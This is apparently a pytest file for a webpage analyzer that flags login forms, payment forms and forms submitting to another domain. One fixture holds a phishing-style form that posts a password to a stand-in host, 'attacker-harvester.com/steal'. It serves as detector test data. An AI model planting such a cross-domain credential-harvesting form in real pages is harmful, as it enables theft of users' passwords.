import pytest
import respx
import httpx
from app.analysis.webpage_analyzer import WebpageAnalyzer


@pytest.mark.asyncio
@respx.mock
async def test_webpage_detects_login_form(monkeypatch):
    import socket
    monkeypatch.setattr(socket, "getaddrinfo", lambda h, p, proto=0: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))])

    html = """
    <html>
        <body>
            <form action="/login" method="post">
                <input type="text" name="username" />
                <input type="password" name="password" />
                <button type="submit">Sign In</button>
            </form>
        </body>
    </html>
    """
    respx.get("https://example.com/login").mock(
        return_value=httpx.Response(200, headers={"content-type": "text/html"}, text=html)
    )

    analyzer = WebpageAnalyzer()
    findings = await analyzer.analyze("https://example.com/login")
    codes = [f.code for f in findings]
    assert "LOGIN_FORM_DETECTED" in codes


@pytest.mark.asyncio
@respx.mock
async def test_webpage_detects_payment_form(monkeypatch):
    import socket
    monkeypatch.setattr(socket, "getaddrinfo", lambda h, p, proto=0: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))])

    html = """
    <html>
        <body>
            <form action="/checkout" method="post">
                <input type="text" name="card_number" placeholder="Credit Card Number" />
                <input type="text" name="cvv" />
                <input type="text" name="exp_date" />
                <button type="submit">Pay Now</button>
            </form>
        </body>
    </html>
    """
    respx.get("https://example.com/pay").mock(
        return_value=httpx.Response(200, headers={"content-type": "text/html"}, text=html)
    )

    analyzer = WebpageAnalyzer()
    findings = await analyzer.analyze("https://example.com/pay")
    codes = [f.code for f in findings]
    assert "PAYMENT_FORM_DETECTED" in codes


@pytest.mark.asyncio
@respx.mock
async def test_webpage_detects_cross_domain_form(monkeypatch):
    import socket
    monkeypatch.setattr(socket, "getaddrinfo", lambda h, p, proto=0: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))])

    html = """
    <html>
        <body>
            <form action="https://attacker-harvester.com/steal" method="post">
                <input type="password" name="pwd" />
            </form>
        </body>
    </html>
    """
    respx.get("https://victim.com/auth").mock(
        return_value=httpx.Response(200, headers={"content-type": "text/html"}, text=html)
    )

    analyzer = WebpageAnalyzer()
    findings = await analyzer.analyze("https://victim.com/auth")
    codes = [f.code for f in findings]
    assert "FORM_SUBMITS_TO_DIFFERENT_DOMAIN" in codes
    assert "LOGIN_FORM_DETECTED" in codes
